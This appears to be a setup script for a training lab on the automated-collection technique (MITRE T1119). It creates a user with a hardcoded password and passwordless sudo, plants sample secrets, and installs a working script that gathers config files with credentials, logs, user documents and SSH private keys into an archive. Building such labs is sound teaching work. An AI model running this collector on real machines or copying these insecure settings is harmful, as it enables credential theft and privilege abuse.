#!/bin/bash
set -euo pipefail
PLAYER="player"; PASS="Player@123"
FLAG="HACKTIFY{AUTOMATED_COLLECTION_$(hostname|sha256sum|cut -c1-8)}"
id "$PLAYER" &>/dev/null || { useradd -m -s /bin/bash "$PLAYER"; echo "$PLAYER:$PASS"|chpasswd; }
echo "$PLAYER ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/player-auto-col; chmod 440 /etc/sudoers.d/player-auto-col
# Create a scattered set of sensitive files to be auto-collected
for dir in /opt/app/configs /var/app/logs /home/$PLAYER/Documents /tmp/shared; do
    mkdir -p "$dir"
done
echo "$FLAG" > /opt/app/configs/app.conf
echo "DB_PASS=AppDB@2024" >> /opt/app/configs/app.conf
echo "api_key=sk-test-9876543210abcdef" > /opt/app/configs/api_keys.txt
echo "2024-01-01 failed login from 185.220.101.1" > /var/app/logs/access.log
echo "2024-01-01 password changed for admin" >> /var/app/logs/access.log
echo "Personal notes: vacation budget $5000" > /home/$PLAYER/Documents/notes.txt
chmod -R 644 /opt/app /var/app /home/$PLAYER/Documents 2>/dev/null || true
chmod -R +X /opt/app /var/app /home/$PLAYER/Documents 2>/dev/null || true
# Create the automated collector script
cat > /opt/auto_collect.sh << 'COLEOF'
#!/bin/bash
# T1119 – Automated Collection Script
# Collects credentials, logs, configs, documents from predefined locations
OUTPUT="/tmp/loot_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTPUT"
echo "[*] Auto-collection started: $(date)" | tee "$OUTPUT/collection.log"

# 1. Config files with credentials
echo "[*] Collecting config files..."
find /opt /etc /var /home -name "*.conf" -o -name "*.config" -o -name "*.ini" \
    -o -name "api_keys*" -o -name ".env" 2>/dev/null | while read f; do
    if grep -qiE "pass|key|secret|token|credential" "$f" 2>/dev/null; then
        cp "$f" "$OUTPUT/" 2>/dev/null && echo "  [+] $f"
    fi
done

# 2. Log files
echo "[*] Collecting log files..."
find /var/log /var/app -name "*.log" -readable 2>/dev/null | while read f; do
    cp "$f" "$OUTPUT/" 2>/dev/null && echo "  [+] $f"
done

# 3. User documents
echo "[*] Collecting user documents..."
find /home -name "*.txt" -o -name "*.pdf" -o -name "*.doc" \
    -o -name "*.xlsx" 2>/dev/null | while read f; do
    cp "$f" "$OUTPUT/" 2>/dev/null
done

# 4. SSH keys
find /root /home -name "id_rsa" -o -name "id_ed25519" -o -name "authorized_keys" 2>/dev/null | while read f; do
    cp "$f" "$OUTPUT/SSH_$(basename $f)_$(stat -c %U $f)" 2>/dev/null && echo "  [+] SSH key: $f"
done

echo "[+] Collection complete. Output: $OUTPUT"
ls -la "$OUTPUT/"
# Archive it
tar czf "${OUTPUT}.tar.gz" "$OUTPUT/" 2>/dev/null
echo "[+] Archive: ${OUTPUT}.tar.gz ($(du -sh ${OUTPUT}.tar.gz | cut -f1))"
COLEOF
chmod 755 /opt/auto_collect.sh
cat > /home/$PLAYER/README.txt << 'RMEOF'
=== T1119 Automated Collection ===
Login  : player / Player@123
Goal   : Run the automated collection script and retrieve the flag.
Step 1 : Review the collector: cat /opt/auto_collect.sh
Step 2 : Run it: sudo bash /opt/auto_collect.sh
Step 3 : Check collected data: ls /tmp/loot_*/
Step 4 : Find the flag in the collected configs: grep HACKTIFY /tmp/loot_*/*.conf
RMEOF
chown $PLAYER:$PLAYER /home/$PLAYER/README.txt
echo "[+] T1119 setup complete."
